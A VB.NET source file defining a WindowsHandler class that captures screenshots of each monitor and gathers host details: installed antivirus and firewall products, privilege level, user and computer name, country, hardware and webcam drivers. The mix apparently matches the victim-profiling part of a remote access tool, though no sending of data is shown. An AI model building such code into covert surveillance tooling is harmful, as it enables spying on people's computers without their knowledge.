Imports System.IO
Imports System.Management
Imports Microsoft.Win32

Public Class WindowsHandler
    Public Shared Function GetMonitors() As Monitors
        Dim Monitors As New Monitors
        Try
            For index As Integer = 0 To Screen.AllScreens.Length - 1
                Dim tempMonitor = Screen.AllScreens(index)
                Dim Monitor As New Monitor
                Monitor.deviceName = tempMonitor.DeviceName
                Monitor.bounds = tempMonitor.Bounds
                Monitor.workingArea = tempMonitor.WorkingArea
                Monitor.primaryScreen = tempMonitor.Primary
                Monitor.screenType = tempMonitor.[GetType]()
                Monitors.Add(Monitor)
            Next
            Return Monitors
        Catch ex As Exception
            Monitors.Add(New Monitor With {.deviceName = "Error!"})
            Return Monitors
        End Try
    End Function
    Public Shared Function ScreenShotMonitor(Monitor As Monitor) As Bitmap
        Try
            Dim screenSize As Size = New Size(Monitor.bounds.Width, Monitor.bounds.Height)
            Dim screenGrab As New Bitmap(Monitor.bounds.Width, Monitor.bounds.Height)
            Dim g As Graphics = Graphics.FromImage(screenGrab)

            g.CopyFromScreen(New Point(Monitor.bounds.X, Monitor.bounds.Y), New Point(0, 0), screenSize)

            Return screenGrab
        Catch ex As Exception
            Dim b As New Bitmap(512, 512)
            Dim g As Graphics = Graphics.FromImage(b)
            g.Clear(Color.Black)
            g.DrawString("Error!" & vbNewLine & ex.Message, New Font("Arial", 10, FontStyle.Regular), Brushes.White, New Rectangle(0, 0, 512, 512), New StringFormat With {.Alignment = StringAlignment.Center, .LineAlignment = StringAlignment.Center})
            Return b
        End Try
    End Function
    Public Shared Function GetAntivirus() As String
        Try
            Dim data As String = String.Empty
            For Each firewall As ManagementObject In New ManagementObjectSearcher("root\SecurityCenter" & IIf(My.Computer.Info.OSFullName.Contains("XP"), "", "2").ToString, "SELECT * FROM AntiVirusProduct").Get
                data &= firewall("displayName").ToString
            Next
            If Not data = String.Empty Then
                Return data
            Else
                Return "No Antivirus"
            End If

        Catch
            Return "No Antivirus"
        End Try

    End Function
    Public Shared Function GetOS() As String
        Try
            Dim data As String = My.Computer.Info.OSFullName
            If Not data = String.Empty Then
                Return data
            Else
                Return "No OS Name!"
            End If
        Catch
            Return "Error getting Operating System Name!"
        End Try
    End Function
    Public Shared Function GetComputerName() As String
        Try
            Dim data As String = My.Computer.Name
            If Not data = String.Empty Then
                Return data
            Else
                Return "No OS Name!"
            End If
        Catch
            Return "Error getting Operating System Name!"
        End Try
    End Function
    Public Shared Function GetCurrentUser() As String
        Try
            Dim data As String = My.User.Name.Split("\").Last
            If Not data = String.Empty Then
                Return data
            Else
                Return "No OS Name!"
            End If
        Catch
            Return "Error getting Operating System Name!"
        End Try
    End Function
    Public Shared Function GetCountry() As String
        Try
            Dim data As String = My.Computer.Info.InstalledUICulture.EnglishName.Split("(").Last.Split(")").First
            If Not data = String.Empty Then
                Return data
            Else
                Return "No OS Name!"
            End If
        Catch
            Return "Error getting Operating System Name!"
        End Try
    End Function
    Public Shared Function GetArchitecture() As String
        Try
            Dim data As Boolean = Environment.Is64BitOperatingSystem
            If Not data Then
                Return "86x"
            Else
                Return "64x"
            End If
        Catch
            Return "Error getting Operating System Architecture!"
        End Try
    End Function
    Public Shared Function GetPrivileges() As String
        Try
            If My.User.IsInRole(ApplicationServices.BuiltInRole.Administrator) Then
                Return "Admin"
            ElseIf My.User.IsInRole(ApplicationServices.BuiltInRole.User) Then
                Return "User"
            ElseIf My.User.IsInRole(ApplicationServices.BuiltInRole.SystemOperator) Then
                Return "System Op"
            ElseIf My.User.IsInRole(ApplicationServices.BuiltInRole.PowerUser) Then
                Return "Power User"
            ElseIf My.User.IsInRole(ApplicationServices.BuiltInRole.BackupOperator) Then
                Return "Backup Op"
            ElseIf My.User.IsInRole(ApplicationServices.BuiltInRole.AccountOperator) Then
                Return "Account Op"
            ElseIf My.User.IsInRole(ApplicationServices.BuiltInRole.PrintOperator) Then
                Return "Print Op"
            ElseIf My.User.IsInRole(ApplicationServices.BuiltInRole.Replicator) Then
                Return "Repilcator"
            ElseIf My.User.IsInRole(ApplicationServices.BuiltInRole.Guest) Then
                Return "Guest"
            Else
                Return "Unknown"
            End If
        Catch
            Return "Error getting Privileges."
        End Try
    End Function
    Public Shared Function GetRam(availableMemory As Boolean) As String
        Try
            Dim data As String
            If availableMemory Then
                data = Math.Round(((((My.Computer.Info.AvailablePhysicalMemory) / 1024) / 1024) / 1024), 1) & " GB"
                If Not data = String.Empty Then
                    Return data
                Else
                    Return "No Ram Info!"
                End If
            Else
                data = Math.Round(((((My.Computer.Info.TotalPhysicalMemory) / 1024) / 1024) / 1024), 1) & " GB"
                If Not data = String.Empty Then
                    Return data
                Else
                    Return "No Ram Info!"
                End If
            End If
        Catch
            Return "Error getting ram!"
        End Try
    End Function
    Public Shared Function GetCPU() As String
        Try
            Dim m_LM As RegistryKey
            Dim m_HW As RegistryKey
            Dim m_Des As RegistryKey
            Dim m_System As RegistryKey
            Dim m_CPU As RegistryKey
            Dim m_Info As RegistryKey
            m_LM = Registry.LocalMachine
            m_HW = m_LM.OpenSubKey("HARDWARE")
            m_Des = m_HW.OpenSubKey("DESCRIPTION")
            m_System = m_Des.OpenSubKey("SYSTEM")
            m_CPU = m_System.OpenSubKey("CentralProcessor")
            m_Info = m_CPU.OpenSubKey("0")
            If Not m_Info.GetValue("ProcessornameString") = String.Empty Then
                Return m_Info.GetValue("ProcessornameString")
            Else
                Return "No Cpu Info Found!"
            End If
        Catch ex As Exception
            Return "Error getting CPU info!"
        End Try
    End Function
    Public Shared Function GetFirewall() As String
        Try

            Dim data As String = String.Empty
            For Each firewall As ManagementObject In New ManagementObjectSearcher("root\SecurityCenter" & IIf(My.Computer.Info.OSFullName.Contains("XP"), "", "2").ToString, "SELECT * FROM FirewallProduct").Get
                data &= firewall("displayName").ToString
            Next
            If Not data = String.Empty Then
                Return data
            Else
                Return "No Firewall"
            End If
        Catch
            Return "No Firewall"
        End Try

    End Function
    Public Shared Function GetWebcams() As Webcams
        On Error Resume Next
        Dim Webcams As New Webcams
        Dim strName As String = Space(100)
        Dim strVer As String = Space(100)
        Dim bReturn As Boolean
        Dim x As Integer = 0
        Do
            bReturn = capGetDriverDescriptionA(x, strName, 100, strVer, 100)
            If bReturn Then Dim Webcam As New WebcamDevice With {.deviceName = strName, .deviceVerison = strVer} : Webcams.Add(Webcam)
            x += 1
            Application.DoEvents()
        Loop Until bReturn = False
        Return Webcams
    End Function
End Class

Public Class Monitors
    Inherits List(Of Monitor)
End Class
Public Class Webcams
    Inherits List(Of WebcamDevice)
End Class
Public Class WebcamDevice
    Public deviceName As String
    Public deviceVerison As String
End Class
Public Class Monitor
    Public deviceName As String
    Public bounds As Rectangle
    Public workingArea As Rectangle
    Public primaryScreen As String
    Public screenType As Type
End Class
